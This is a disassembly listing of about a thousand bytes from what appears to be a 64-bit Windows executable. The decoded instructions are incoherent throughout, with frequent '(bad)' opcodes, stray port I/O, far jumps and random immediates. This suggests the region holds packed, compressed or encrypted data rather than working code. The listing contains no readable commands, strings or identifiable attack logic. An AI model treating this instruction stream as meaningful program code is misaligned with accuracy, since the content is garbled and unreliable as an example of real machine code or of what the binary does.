   14000ebc2:	ae                   	scas   (%rdi),%al
   14000ebc3:	71 04                	jno    0x14000ebc9
   14000ebc5:	82                   	(bad)
   14000ebc6:	39 2d 8b 37 3e ad    	cmp    %ebp,-0x52c1c875(%rip)        # 0xed3f2357
   14000ebcc:	8d 4f 20             	lea    0x20(%rdi),%ecx
   14000ebcf:	4f 50                	rex.WRXB push %r8
   14000ebd1:	a1 45 82 3d 36 53 65 	movabs 0x2e446553363d8245,%eax
   14000ebd8:	44 2e 
   14000ebda:	f8                   	clc
   14000ebdb:	65 00 c5             	gs add %al,%ch
   14000ebde:	2a 42 6d             	sub    0x6d(%rdx),%al
   14000ebe1:	0f 41 b1 86 af 2d f7 	cmovno -0x8d2507a(%rcx),%esi
   14000ebe8:	b5 86                	mov    $0x86,%ch
   14000ebea:	45 15 8a 87 3d a5    	rex.RB adc $0xa53d878a,%eax
   14000ebf0:	15 8a 55 8c 59       	adc    $0x598c558a,%eax
   14000ebf5:	49 77 ad             	rex.WB ja 0x14000eba5
   14000ebf8:	ae                   	scas   (%rdi),%al
   14000ebf9:	c4                   	(bad)
   14000ebfa:	3f                   	(bad)
   14000ebfb:	81 b7 44 54 29 52 14 	xorl   $0x2f1b2b14,0x52295444(%rdi)
   14000ec02:	2b 1b 2f 
   14000ec05:	6c                   	insb   (%dx),(%rdi)
   14000ec06:	a1 86 0b 5a da 46 8c 	movabs 0x5c988c46da5a0b86,%eax
   14000ec0d:	98 5c 
   14000ec0f:	04 aa                	add    $0xaa,%al
   14000ec11:	9f                   	lahf
   14000ec12:	82                   	(bad)
   14000ec13:	52                   	push   %rdx
   14000ec14:	54                   	push   %rsp
   14000ec15:	2c 01                	sub    $0x1,%al
   14000ec17:	51                   	push   %rcx
   14000ec18:	27                   	(bad)
   14000ec19:	38 16                	cmp    %dl,(%rsi)
   14000ec1b:	5c                   	pop    %rsp
   14000ec1c:	fd                   	std
   14000ec1d:	7a 4f                	jp     0x14000ec6e
   14000ec1f:	57                   	push   %rdi
   14000ec20:	07                   	(bad)
   14000ec21:	2e 0a d5             	cs or  %ch,%dl
   14000ec24:	81 a3 03 37 2e 17 4b 	andl   $0x34b8a74b,0x172e3703(%rbx)
   14000ec2b:	a7 b8 34 
   14000ec2e:	2e 8b 17             	cs mov (%rdi),%edx
   14000ec31:	f0 39 32             	lock cmp %esi,(%rdx)
   14000ec34:	ec                   	in     (%dx),%al
   14000ec35:	a0 cb b0 0f 08 80 ac 	movabs 0x8bfaac80080fb0cb,%al
   14000ec3c:	fa 8b 
   14000ec3e:	42 1d a0 38 3f 41    	rex.X sbb $0x413f38a0,%eax
   14000ec44:	72 67                	jb     0x14000ecad
   14000ec46:	75 6d                	jne    0x14000ecb5
   14000ec48:	4b ef                	rex.WXB out %eax,(%dx)
   14000ec4a:	c6                   	(bad)
   14000ec4b:	17                   	(bad)
   14000ec4c:	76 64                	jbe    0x14000ecb2
   14000ec4e:	6f                   	outsl  (%rsi),(%dx)
   14000ec4f:	6d                   	insl   (%dx),(%rdi)
   14000ec50:	d4                   	(bad)
   14000ec51:	20 65 72             	and    %ah,0x72(%rbp)
   14000ec54:	72 b4                	jb     0x14000ec0a
   14000ec56:	02 83 ab 24 28 46    	add    0x462824ab(%rbx),%al
   14000ec5c:	b4 60                	mov    $0x60,%ah
   14000ec5e:	29 3d 5b 81 ee d0    	sub    %edi,-0x2f117ea5(%rip)        # 0x110ef6dbf
   14000ec64:	73 bc                	jae    0x14000ec22
   14000ec66:	75 6c                	jne    0x14000ecd4
   14000ec68:	61                   	(bad)
   14000ec69:	48 79 3a             	rex.W jns 0x14000eca6
   14000ec6c:	53                   	push   %rbx
   14000ec6d:	49 2a ed             	rex.WB sub %r13b,%bpl
   14000ec70:	c2 ec 47             	ret    $0x47ec
   14000ec73:	4e 29 7f 4f          	rex.WRX sub %r15,0x4f(%rdi)
   14000ec77:	8a 66 6c             	mov    0x6c(%rsi),%ah
   14000ec7a:	4a 56                	rex.WX push %rsi
   14000ec7c:	2d c2 da 72 61       	sub    $0x6172dac2,%eax
   14000ec81:	40                   	rex
   14000ec82:	65 7d 0b             	gs jge 0x14000ec90
   14000ec85:	46 d0 b6 02 b9 d1 48 	rex.RX shlb $1,0x48d1b902(%rsi)
   14000ec8c:	50                   	push   %rax
   14000ec8d:	a4                   	movsb  (%rsi),(%rdi)
   14000ec8e:	f4                   	hlt
   14000ec8f:	20 44 73 73          	and    %al,0x73(%rbx,%rsi,2)
   14000ec93:	f6 c4 b7             	test   $0xb7,%ah
   14000ec96:	87 e0                	xchg   %esp,%eax
   14000ec98:	8e 67 6e             	mov    0x6e(%rdi),%fs
   14000ec9b:	69 66 69 e4 5a c4 fe 	imul   $0xfec45ae4,0x69(%rsi),%esp
   14000eca2:	0c ab                	or     $0xab,%al
   14000eca4:	28 aa 66 93 54 6f    	sub    %ch,0x6f549366(%rdx)
   14000ecaa:	74 4b                	je     0x14000ecf7
   14000ecac:	42 a4                	rex.X movsb (%rsi),(%rdi)
   14000ecae:	1b 72 54             	sbb    0x54(%rdx),%esi
   14000ecb1:	4e 76 b6             	rex.WRX jbe 0x14000ec6a
   14000ecb4:	91                   	xchg   %eax,%ecx
   14000ecb5:	84 10                	test   %dl,(%rax)
   14000ecb7:	ba 88 93 6f 6f       	mov    $0x6f6f9388,%edx
   14000ecbc:	56                   	push   %rsi
   14000ecbd:	d7                   	xlat   (%rbx)
   14000ecbe:	24 17                	and    $0x17,%al
   14000ecc0:	04 6e                	add    $0x6e,%al
   14000ecc2:	42                   	rex.X
   14000ecc3:	3e 62 33 e0 85 18    	(bad)
   14000ecc9:	5c                   	pop    %rsp
   14000ecca:	70 38                	jo     0x14000ed04
   14000eccc:	5e                   	pop    %rsi
   14000eccd:	a4                   	movsb  (%rsi),(%rdi)
   14000ecce:	28 55 4e             	sub    %dl,0x4e(%rbp)
   14000ecd1:	44 b7 c0             	rex.R mov $0xc0,%dil
   14000ecd4:	a4                   	movsb  (%rsi),(%rdi)
   14000ecd5:	87 0b                	xchg   %ecx,(%rbx)
   14000ecd7:	55                   	push   %rbp
   14000ecd8:	6e                   	outsb  (%rsi),(%dx)
   14000ecd9:	6b 1a bb             	imul   $0xffffffbb,(%rdx),%ebx
   14000ecdc:	8f                   	(bad)
   14000ecdd:	d2 02                	rolb   %cl,(%rdx)
   14000ecdf:	7c db                	jl     0x14000ecbc
   14000ece1:	5f                   	pop    %rdi
   14000ece2:	6a 74                	push   $0x74
   14000ece4:	68 1c 28 29 78       	push   $0x7829281c
   14000ece9:	25 73 73 99 e2       	and    $0xe2997373,%eax
   14000ecee:	b6 b6                	mov    $0xb6,%dh
   14000ecf0:	0a 28                	or     (%rax),%ch
   14000ecf2:	25 67 da 06 c0       	and    $0xc006da67,%eax
   14000ecf7:	76 52                	jbe    0x14000ed4b
   14000ecf9:	b8 56 24 48 76       	mov    $0x76482456,%eax
   14000ecfe:	ac                   	lods   (%rsi),%al
   14000ecff:	3d 18 3c cf f3       	cmp    $0xf3cf3c18,%eax
   14000ed04:	be 80 b8 c7 ff       	mov    $0xffc7b880,%esi
   14000ed09:	ff 6c 06 04          	ljmp   *0x4(%rsi,%rax,1)
   14000ed0d:	8c 9c ac ad fd c3 f3 	mov    %ds,-0xc3c0253(%rsp,%rbp,4)
   14000ed14:	7c 4d                	jl     0x14000ed63
   14000ed16:	2e 77 2d             	ja,pn  0x14000ed46
   14000ed19:	77 36                	ja     0x14000ed51
   14000ed1b:	34 f6                	xor    $0xf6,%al
   14000ed1d:	75 ec                	jne    0x14000ed0b
   14000ed1f:	69 33 9c 12 0d 56    	imul   $0x560d129c,(%rbx),%esi
   14000ed25:	20 01                	and    %al,(%rcx)
   14000ed27:	3a 0a                	cmp    (%rdx),%cl
   14000ed29:	bf 64 c0 52 ed       	mov    $0xed52c064,%edi
   14000ed2e:	a5                   	movsl  (%rsi),(%rdi)
   14000ed2f:	64 60                	fs (bad)
   14000ed31:	ac                   	lods   (%rsi),%al
   14000ed32:	70 1d                	jo     0x14000ed51
   14000ed34:	1d e9 6b 98 0a       	sbb    $0xa986be9,%eax
   14000ed39:	d4                   	(bad)
   14000ed3a:	fc                   	cld
   14000ed3b:	2d 73 65 e1 77       	sub    $0x77e16573,%eax
   14000ed40:	d4                   	(bad)
   14000ed41:	d6                   	udb
   14000ed42:	b0 d6                	mov    $0xd6,%al
   14000ed44:	56                   	push   %rsi
   14000ed45:	69 42 75 d6 51 75 54 	imul   $0x547551d6,0x75(%rdx),%eax
   14000ed4c:	79 50                	jns    0x14000ed9e
   14000ed4e:	a9 87 03 76 66       	test   $0x66760387,%eax
   14000ed53:	88 25 1e 79 18 2b    	mov    %ah,0x2b18791e(%rip)        # 0x16b196677
   14000ed59:	10 4a 90             	adc    %cl,-0x70(%rdx)
   14000ed5c:	a8 d4                	test   $0xd4,%al
   14000ed5e:	61                   	(bad)
   14000ed5f:	8b 49 82             	mov    -0x7e(%rcx),%ecx
   14000ed62:	63 a1 6f 6f 50 a2    	movsxd -0x5daf9091(%rcx),%esp
   14000ed68:	ad                   	lods   (%rsi),%eax
   14000ed69:	b1 62                	mov    $0x62,%cl
   14000ed6b:	d8 c8                	fmul   %st(0),%st
   14000ed6d:	73 77                	jae    0x14000ede6
   14000ed6f:	40 68 20 9b 30 8a    	rex push $0xffffffff8a309b20
   14000ed75:	36 04 ee             	ss add $0xee,%al
   14000ed78:	78 25                	js     0x14000ed9f
   14000ed7a:	78 4f                	js     0x14000edcb
   14000ed7c:	f7 70 e4             	divl   -0x1c(%rax)
   14000ed7f:	75 c8                	jne    0x14000ed49
   14000ed81:	d7                   	xlat   (%rbx)
   14000ed82:	1b 1b                	sbb    (%rbx),%ebx
   14000ed84:	0e                   	(bad)
   14000ed85:	44 c8 63 61 e7       	rex.R enter $0x6163,$0xe7
   14000ed8a:	70 74                	jo     0x14000ee00
   14000ed8c:	7d 8f                	jge    0x14000ed1d
   14000ed8e:	68 68 16 6f 78       	push   $0x786f1668
   14000ed93:	76 f3                	jbe    0x14000ed88
   14000ed95:	e4 2e                	in     $0x2e,%al
   14000ed97:	0a ed                	or     %ch,%ch
   14000ed99:	71 8a                	jno    0x14000ed25
   14000ed9b:	8d bf 6f 62 69 1f    	lea    0x1f69626f(%rdi),%edi
   14000eda1:	7a 65                	jp     0x14000ee08
   14000eda3:	b0 da                	mov    $0xda,%al
   14000eda5:	06                   	(bad)
   14000eda6:	81 5f 5b 69 74 59 61 	sbbl   $0x61597469,0x5b(%rdi)
   14000edad:	e1 c6                	loope  0x14000ed75
   14000edaf:	60                   	(bad)
   14000edb0:	7a f6                	jp     0x14000eda8
   14000edb2:	d6                   	udb
   14000edb3:	af                   	scas   (%rdi),%eax
   14000edb4:	db ac c2 f0 49 c6 d4 	fldt   -0x2b39b610(%rdx,%rax,8)
   14000edbb:	72 0c                	jb     0x14000edc9
   14000edbd:	3a 6e 67             	cmp    0x67(%rsi),%ch
   14000edc0:	34 61                	xor    $0x61,%al
   14000edc2:	28 d7                	sub    %dl,%bh
   14000edc4:	b6 1a                	mov    $0x1a,%dh
   14000edc6:	79 69                	jns    0x14000ee31
   14000edc8:	5a                   	pop    %rdx
   14000edc9:	64 19 2e             	sbb    %ebp,%fs:(%rsi)
   14000edcc:	9a                   	(bad)
   14000edcd:	e1 20                	loope  0x14000edef
   14000edcf:	ef                   	out    %eax,(%dx)
   14000edd0:	ea                   	(bad)
   14000edd1:	75 b0                	jne    0x14000ed83
   14000edd3:	70 d0                	jo     0x14000eda5
   14000edd5:	cc                   	int3
   14000edd6:	c6 07 95             	movb   $0x95,(%rdi)
   14000edd9:	f0 76 1b             	lock jbe 0x14000edf7
   14000eddc:	7d 0f                	jge    0x14000eded
   14000edde:	f8                   	clc
   14000eddf:	17                   	(bad)
   14000ede0:	5b                   	pop    %rbx
   14000ede1:	cc                   	int3
   14000ede2:	a7                   	cmpsl  (%rdi),(%rsi)
   14000ede3:	97                   	xchg   %eax,%edi
   14000ede4:	70 b1                	jo     0x14000ed97
   14000ede6:	17                   	(bad)
   14000ede7:	33 80 1f 90 3f 44    	xor    0x443f901f(%rax),%eax
   14000eded:	72 62                	jb     0x14000ee51
   14000edef:	13 d0                	adc    %eax,%edx
   14000edf1:	1f                   	(bad)
   14000edf2:	55                   	push   %rbp
   14000edf3:	30 55 b6             	xor    %dl,-0x4a(%rbp)
   14000edf6:	2e e1 50             	loope,pn 0x14000ee49
   14000edf9:	40 7f 00             	rex jg 0x14000edfc
   14000edfc:	1d 5c c8 c5 0e       	sbb    $0xec5c85c,%eax
   14000ee01:	93                   	xchg   %eax,%ebx
   14000ee02:	a0 1f c0 d8 42 4e c8 	movabs 0xe085c84e42d8c01f,%al
   14000ee09:	85 e0 
   14000ee0b:	80 c0 d8             	add    $0xd8,%al
   14000ee0e:	42                   	rex.X
   14000ee0f:	2e e4 a8             	cs in  $0xa8,%al
   14000ee12:	a4                   	movsb  (%rsi),(%rdi)
   14000ee13:	df 2e                	fildll (%rsi)
   14000ee15:	f6 22                	mulb   (%rdx)
   14000ee17:	b8 81 1f 80 70       	mov    $0x70801f81,%eax
   14000ee1c:	1f                   	(bad)
   14000ee1d:	78 90                	js     0x14000edaf
   14000ee1f:	b6 58                	mov    $0x58,%dh
   14000ee21:	42 7d 1e             	rex.X jge 0x14000ee42
   14000ee24:	10 76 b1             	adc    %dh,-0x4f(%rsi)
   14000ee27:	0b b9 18 28 9f b0    	or     -0x4f60d7e8(%rcx),%edi
   14000ee2d:	1f                   	(bad)
   14000ee2e:	27                   	(bad)
   14000ee2f:	e4 42                	in     $0x42,%al
   14000ee31:	2e 80 f0 1f          	cs xor $0x1f,%al
   14000ee35:	30 e1                	xor    %ah,%cl
   14000ee37:	45 31 21             	xor    %r12d,(%r9)
   14000ee3a:	18 1f                	sbb    %bl,(%rdi)
   14000ee3c:	80 90 b6 a8 aa 06 4f 	adcb   $0x4f,0x6aaa8b6(%rax)
   14000ee43:	01 68 c6             	add    %ebp,-0x3a(%rax)
   14000ee46:	88 28                	mov    %ch,(%rax)
   14000ee48:	b2 01                	mov    $0x1,%dl
   14000ee4a:	f7 da                	neg    %edx
   14000ee4c:	77 cf                	ja     0x14000ee1d
   14000ee4e:	ba 80 14 0e 2e       	mov    $0x2e0e1480,%edx
   14000ee53:	11 06                	adc    %eax,(%rsi)
   14000ee55:	04 16                	add    $0x16,%al
   14000ee57:	30 0e                	xor    %cl,(%rsi)
   14000ee59:	ef                   	out    %eax,(%dx)
   14000ee5a:	b5 ef                	mov    $0xef,%ch
   14000ee5c:	bd 79 06 0c 16       	mov    $0x160c0679,%ebp
   14000ee61:	80 0e ae             	orb    $0xae,(%rsi)
   14000ee64:	14 06                	adc    $0x6,%al
   14000ee66:	14 16                	adc    $0x16,%al
   14000ee68:	b0 0e                	mov    $0xe,%al
   14000ee6a:	cd be                	int    $0xbe
   14000ee6c:	f7 de                	neg    %esi
   14000ee6e:	7b 06                	jnp    0x14000ee76
   14000ee70:	28 16                	sub    %dl,(%rsi)
   14000ee72:	d0 0e                	rorb   $1,(%rsi)
   14000ee74:	ed                   	in     (%dx),%eax
   14000ee75:	06                   	(bad)
   14000ee76:	48 16                	rex.W (bad)
   14000ee78:	f0 0e                	lock (bad)
   14000ee7a:	04 15                	add    $0x15,%al
   14000ee7c:	7b ef                	jnp    0x14000ee6d
   14000ee7e:	3d d7 06 68 8f       	cmp    $0x8f6806d7,%eax
   14000ee83:	0e                   	(bad)
   14000ee84:	1c 06                	sbb    $0x6,%al
   14000ee86:	70 16                	jo     0x14000ee9e
   14000ee88:	20 0e                	and    %cl,(%rsi)
   14000ee8a:	21 06                	and    %eax,(%rsi)
   14000ee8c:	6f                   	outsl  (%rsi),(%dx)
   14000ee8d:	f6 69 dd             	imulb  -0x23(%rcx)
   14000ee90:	74 17                	je     0x14000eea9
   14000ee92:	16                   	(bad)
   14000ee93:	06                   	(bad)
   14000ee94:	42 78 80             	rex.X js 0x14000ee17
   14000ee97:	0f 89 06 84 d5 98    	jns    0xd8d672a3
   14000ee9d:	7d b3                	jge    0x14000ee52
   14000ee9f:	80 0f d0             	orb    $0xd0,(%rdi)
   14000eea2:	06                   	(bad)
   14000eea3:	90                   	nop
   14000eea4:	80 0f 68             	orb    $0x68,(%rdi)
   14000eea7:	ba 9c 04 cc b6       	mov    $0xb6cc049c,%edx
   14000eeac:	b3 80                	mov    $0x80,%bl
   14000eeae:	0f 2f 1a             	comiss (%rdx),%xmm3
   14000eeb1:	06                   	(bad)
   14000eeb2:	a8 80                	test   $0x80,%al
   14000eeb4:	0f a0                	push   %fs
   14000eeb6:	9b                   	fwait
   14000eeb7:	6d                   	insl   (%dx),(%rdi)
   14000eeb8:	67 0b 48 b8          	or     -0x48(%eax),%ecx
   14000eebc:	80 0f 04             	orb    $0x4,(%rdi)
   14000eebf:	20 06                	and    %al,(%rsi)
   14000eec1:	c8 80 0f 2b          	enter  $0xf80,$0x2b
   14000eec5:	06                   	(bad)
   14000eec6:	b6 b3                	mov    $0xb3,%dh
   14000eec8:	ed                   	in     (%dx),%eax
   14000eec9:	ec                   	in     (%dx),%al
   14000eeca:	d4                   	(bad)
   14000eecb:	80 0f bf             	orb    $0xbf,(%rdi)
   14000eece:	21 06                	and    %eax,(%rsi)
   14000eed0:	e0 80                	loopne 0x14000ee52
   14000eed2:	0f 76 22             	pcmpeqd (%rdx),%mm4
   14000eed5:	06                   	(bad)
   14000eed6:	ec                   	in     (%dx),%al
   14000eed7:	80 d9 37             	sbb    $0x37,%cl
   14000eeda:	db ce                	fcmovne %st(6),%st
   14000eedc:	0f 46 23             	cmovbe (%rbx),%esp
   14000eedf:	06                   	(bad)
   14000eee0:	f8                   	clc
   14000eee1:	80 0f 62             	orb    $0x62,(%rdi)
   14000eee4:	06                   	(bad)
   14000eee5:	04 81                	add    $0x81,%al
   14000eee7:	0f 6f f6             	movq   %mm6,%mm6
   14000eeea:	cd be                	int    $0xbe
   14000eeec:	7e 06                	jle    0x14000eef4
   14000eeee:	10 81 0f 9a 06 1c    	adc    %al,0x1c069a0f(%rcx)
   14000eef4:	81 0f b6 06 28 00    	orl    $0x2806b6,(%rdi)
   14000eefa:	98                   	cwtl
   14000eefb:	7d b3                	jge    0x14000eeb0
   14000eefd:	81 0f d2 06 34 81    	orl    $0x813406d2,(%rdi)
   14000ef03:	0f 61 27             	punpcklwd (%rdi),%mm4
   14000ef06:	86 ce                	xchg   %cl,%dh
   14000ef08:	56                   	push   %rsi
   14000ef09:	72 40                	jb     0x14000ef4b
   14000ef0b:	81 0f d0 26 9e 16    	orl    $0x169e26d0,(%rdi)
   14000ef11:	ef                   	out    %eax,(%dx)
   14000ef12:	bd d7 be e0 0e       	mov    $0xee0bed7,%ebp
   14000ef17:	1a 27                	sbb    (%rdi),%ah
   14000ef19:	06                   	(bad)
   14000ef1a:	58                   	pop    %rax
   14000ef1b:	16                   	(bad)
   14000ef1c:	20 0e                	and    %cl,(%rsi)
   14000ef1e:	8a 06                	mov    (%rsi),%al
   14000ef20:	60                   	(bad)
   14000ef21:	16                   	(bad)
   14000ef22:	90                   	nop
   14000ef23:	bd f7 de 7b 0e       	mov    $0xe7bdef7,%ebp
   14000ef28:	af                   	scas   (%rdi),%eax
   14000ef29:	06                   	(bad)
   14000ef2a:	6c                   	insb   (%dx),(%rdi)
   14000ef2b:	16                   	(bad)
   14000ef2c:	b0 0e                	mov    $0xe,%al
   14000ef2e:	b3 06                	mov    $0x6,%bl
   14000ef30:	70 16                	jo     0x14000ef48
   14000ef32:	c0 2b d0             	shrb   $0xd0,(%rbx)
   14000ef35:	7b ef                	jnp    0x14000ef26
   14000ef37:	0e                   	(bad)
   14000ef38:	ef                   	out    %eax,(%dx)
   14000ef39:	06                   	(bad)
   14000ef3a:	74 16                	je     0x14000ef52
   14000ef3c:	f0 0e                	lock (bad)
   14000ef3e:	71 7a                	jno    0x14000efba
   14000ef40:	7c 16                	jl     0x14000ef58
   14000ef42:	2e 39 f7             	cs cmp %esi,%edi
   14000ef45:	de 80 0e 83 06 88    	fiadds -0x77f97cf2(%rax)
   14000ef4b:	77 0f                	ja     0x14000ef5c
   14000ef4d:	a6                   	cmpsb  (%rdi),(%rsi)
   14000ef4e:	e1 7b                	loope  0x14000efcb
   14000ef50:	ef                   	out    %eax,(%dx)
   14000ef51:	b9 8c 17 0e 93       	mov    $0x930e178c,%ecx
   14000ef56:	06                   	(bad)
   14000ef57:	a4                   	movsb  (%rsi),(%rdi)
   14000ef58:	16                   	(bad)
   14000ef59:	a0 0e 09 2a fb 5c fb 	movabs 0x26defb5cfb2a090e,%al
   14000ef60:	de 26 
   14000ef62:	16                   	(bad)
   14000ef63:	10 0e                	adc    %cl,(%rsi)
   14000ef65:	72 2b                	jb     0x14000ef92
   14000ef67:	06                   	(bad)
   14000ef68:	b4 77                	mov    $0x77,%ah
   14000ef6a:	0e                   	(bad)
   14000ef6b:	db 2e                	fldt   (%rsi)
   14000ef6d:	b6 67                	mov    $0x67,%dh
   14000ef6f:	d0 3e                	sarb   $1,(%rsi)
   14000ef71:	83 1f 0e             	sbbl   $0xe,(%rdi)
   14000ef74:	1e                   	(bad)
   14000ef75:	2f                   	(bad)
   14000ef76:	06                   	(bad)
   14000ef77:	d8 1f                	fcomps (%rdi)
   14000ef79:	0e                   	(bad)
   14000ef7a:	af                   	scas   (%rdi),%eax
   14000ef7b:	40 ef                	rex out %eax,(%dx)
   14000ef7d:	bd 2c 06 e0 16       	mov    $0x16e0062c,%ebp
   14000ef82:	30 0e                	xor    %cl,(%rsi)
   14000ef84:	c8 d2 e4 16          	enter  $0xe4d2,$0x16
   14000ef88:	d0 c1                	rol    $1,%cl
   14000ef8a:	9b                   	fwait
   14000ef8b:	3d 7c 0e 40 31       	cmp    $0x31400e7c,%eax
   14000ef90:	3e 81 0f af 06 fc 4f 	ds orl $0x4ffc06af,(%rdi)
   14000ef97:	16                   	(bad)
   14000ef98:	df 6d 9f             	fildll -0x61(%rbp)
   14000ef9b:	0e                   	(bad)
   14000ef9c:	31 32                	xor    %esi,(%rdx)
   14000ef9e:	06                   	(bad)
   14000ef9f:	08 82 2e 0e 32 33    	or     %al,0x33320e2e(%rdx)
   14000efa5:	ee                   	out    %al,(%dx)
   14000efa6:	7d ef                	jge    0x14000ef97
   14000efa8:	bd e7 17 0e 6c       	mov    $0x6c0e17e7,%ebp
   14000efad:	06                   	(bad)
   14000efae:	1c 16                	sbb    $0x16,%al
   14000efb0:	70 0e                	jo     0x14000efc0
   14000efb2:	c0 06 20             	rolb   $0x20,(%rsi)
   14000efb5:	82                   	(bad)
   14000efb6:	df 7b d5             	fistpll -0x2b(%rbx)
   14000efb9:	9a                   	(bad)
   14000efba:	0f 5d 54 24 16       	minps  0x16(%rsp),%xmm2
   14000efbf:	60                   	(bad)
   14000efc0:	0e                   	(bad)
   14000efc1:	e0 06                	loopne 0x14000efc9
   14000efc3:	30 82 bd f7 0e 67    	xor    %al,0x670ef7bd(%rdx)
   14000efc9:	0f 17 35 6e 16 20 0e 	movhps %xmm6,0xe20166e(%rip)        # 0x14e21063e
   14000efd0:	93                   	xchg   %eax,%ebx
   14000efd1:	06                   	(bad)
   14000efd2:	38 77 9f             	cmp    %dh,-0x61(%rdi)
   14000efd5:	7b ef                	jnp    0x14000efc6
   14000efd7:	16                   	(bad)
   14000efd8:	a0 0e d6 06 3c 47 0e 	movabs 0x36690e473c06d60e,%al
   14000efdf:	69 36 
   14000efe1:	b6 a7                	mov    $0xa7,%dh
   14000efe3:	bd d7 41 3d 0e       	mov    $0xe3d41d7,%ebp
   14000efe8:	36 7a 44             	ss jp  0x14000f02f
   14000efeb:	16                   	(bad)
   14000efec:	80 0e 8b             	orb    $0x8b,(%rsi)
   14000efef:	dc 7b 6f             	fdivrl 0x6f(%rbx)
   14000eff2:	44 6c                	rex.R insb (%dx),(%rdi)
   14000eff4:	16                   	(bad)
   14000eff5:	90                   	nop
   14000eff6:	0e                   	(bad)
   14000eff7:	9b                   	fwait
   14000eff8:	06                   	(bad)
   14000eff9:	4c 77 06             	rex.WR ja 0x14000f002
   14000effc:	ef                   	out    %eax,(%dx)
   14000effd:	bd f7 0e ab 06       	mov    $0x6ab0ef7,%ebp
   14000f002:	50                   	push   %rax
   14000f003:	16                   	(bad)
   14000f004:	b0 0e                	mov    $0xe,%al
   14000f006:	b8 06 54 07 b9       	mov    $0xb9075406,%eax
   14000f00b:	f7 de                	neg    %esi
   14000f00d:	7b 0e                	jnp    0x14000f01d
   14000f00f:	cb                   	lret
   14000f010:	06                   	(bad)
   14000f011:	58                   	pop    %rax
   14000f012:	16                   	(bad)
   14000f013:	d0 0e                	rorb   $1,(%rsi)
   14000f015:	ef                   	out    %eax,(%dx)
   14000f016:	06                   	(bad)
   14000f017:	5c                   	pop    %rsp
   14000f018:	2f                   	(bad)
   14000f019:	55                   	push   %rbp
   14000f01a:	31 be 4e ba c5 06    	xor    %edi,0x6c5ba4e(%rsi)
   14000f020:	64 82                	fs (bad)
   14000f022:	c9                   	leave
   14000f023:	11 10                	adc    %edx,(%rax)
   14000f025:	5b                   	pop    %rbx
   14000f026:	54                   	push   %rsp
   14000f027:	01 9f db d6 4d 01    	add    %ebx,0x14dd6db(%rdi)
   14000f02d:	07                   	(bad)
   14000f02e:	04 0a                	add    $0xa,%al
   14000f030:	04 42                	add    $0x42,%al
   14000f032:	0f 62 0d 07 56 0d fc 	punpckldq -0x3f2a9f9(%rip),%mm1        # 0x13c0e4640
   14000f039:	ff 00                	incl   (%rax)
   14000f03b:	0d 01 12 00 06       	or     $0x6001201,%eax
   14000f040:	30 05 60 04 70 03    	xor    %al,0x3700460(%rip)        # 0x14370f4a6
   14000f046:	50                   	push   %rax
   14000f047:	02 fa                	add    %dl,%bh
   14000f049:	09 47 87             	or     %eax,-0x79(%rdi)
   14000f04c:	56                   	push   %rsi
   14000f04d:	69 f6 f0 37 67 b4    	imul   $0xb46737f0,%esi,%esi
   14000f053:	de c7                	faddp  %st,%st(7)
   14000f055:	14 a7                	adc    $0xa7,%al
   14000f057:	f6 f6                	div    %dh
   14000f059:	a6                   	cmpsb  (%rdi),(%rsi)
   14000f05a:	f6 c7 14             	test   $0x14,%bh
   14000f05d:	3f                   	(bad)
   14000f05e:	d4                   	(bad)
   14000f05f:	26 e7 3f             	es out %eax,$0x3f
   14000f062:	e7 14                	out    %eax,$0x14
   14000f064:	c7                   	(bad)
   14000f065:	15 fb 1f b6 e7       	adc    $0xe7b61ffb,%eax
   14000f06a:	08 03                	or     %al,(%rbx)
   14000f06c:	05 08 32 04 03       	add    $0x3043208,%eax
   14000f071:	01 50 17             	add    %edx,0x17(%rax)
   14000f074:	bf ff 77 ff 0b       	mov    $0xbff77ff,%edi
   14000f079:	04 05                	add    $0x5,%al
   14000f07b:	0b 01                	or     (%rcx),%eax
   14000f07d:	18 00                	sbb    %al,(%rax)
   14000f07f:	1b 01                	sbb    (%rcx),%eax
   14000f081:	11 05 95 11 03 09    	adc    %eax,0x9031195(%rip)        # 0x14904021c
   14000f087:	01 13                	add    %edx,(%rbx)
   14000f089:	00 02                	add    %al,(%rdx)
   14000f08b:	30 37                	xor    %dh,(%rdi)
   14000f08d:	12 06                	adc    (%rsi),%al
   14000f08f:	ff 88 fd f7 c5 12    	decl   0x12c5f7fd(%rax)
   14000f095:	03 0a                	add    (%rdx),%ecx
   14000f097:	3a 03                	cmp    (%rbx),%al
   14000f099:	30 02                	xor    %al,(%rdx)
   14000f09b:	60                   	(bad)
   14000f09c:	01 50 87             	add    %edx,-0x79(%rax)
   14000f09f:	10 04 85 10 03 08 c1 	adc    %al,-0x3ef7fcf0(,%rax,4)
   14000f0a6:	7f 5b                	jg     0x14000f103
   14000f0a8:	ec                   	in     (%dx),%al
   14000f0a9:	01 78 00             	add    %edi,0x0(%rax)
   14000f0ac:	47 b6 35             	rex.RXB mov $0x35,%r14b
   14000f0af:	0b 03                	or     (%rbx),%eax
   14000f0b1:	06                   	(bad)
   14000f0b2:	62 02 30 01 50 17    	vpdpbuud (%r15),%xmm25,%xmm26{%k1}
   14000f0b8:	c9                   	leave
   14000f0b9:	10 6c 00 17          	adc    %ch,0x17(%rax,%rax,1)
   14000f0bd:	d2 e0                	shl    %cl,%al
   14000f0bf:	35 1c 82 df 06       	xor    $0x6df821c,%eax
   14000f0c4:	03 8e 42 ca 60 ff    	add    -0x9f35be(%rsi),%ecx
   14000f0ca:	7f 88                	jg     0x14000f054
   14000f0cc:	ad                   	lods   (%rsi),%eax
   14000f0cd:	f7 37                	divl   (%rdi)
   14000f0cf:	16                   	(bad)
   14000f0d0:	09 00                	or     %eax,(%rax)
   14000f0d2:	16                   	(bad)
   14000f0d3:	88 06                	mov    %al,(%rsi)
   14000f0d5:	00 10                	add    %dl,(%rax)
   14000f0d7:	78 05                	js     0x14000f0de
   14000f0d9:	00 0b                	add    %cl,(%rbx)
   14000f0db:	68 04 76 eb 96       	push   $0xffffffff96eb7604
   14000f0e0:	34 e2                	xor    $0xe2,%al
   14000f0e2:	57                   	push   %rdi
   14000f0e3:	62 1f 07 36 ff       	(bad)
   14000f0e8:	ff                   	(bad)
   14000f0e9:	ff c1                	inc    %ecx
   14000f0eb:	07                   	(bad)
   14000f0ec:	92                   	xchg   %eax,%edx
   14000f0ed:	ef                   	out    %eax,(%dx)
   14000f0ee:	70 01                	jo     0x14000f0f1
   14000f0f0:	15 0a 45 15 03       	adc    $0x315450a,%eax
   14000f0f5:	10 82 0c 30 0b 60    	adc    %al,0x600b300c(%rdx)
   14000f0fb:	0a 70 09             	or     0x9(%rax),%dh
   14000f0fe:	c0 07 d0             	rolb   $0xd0,(%rdi)
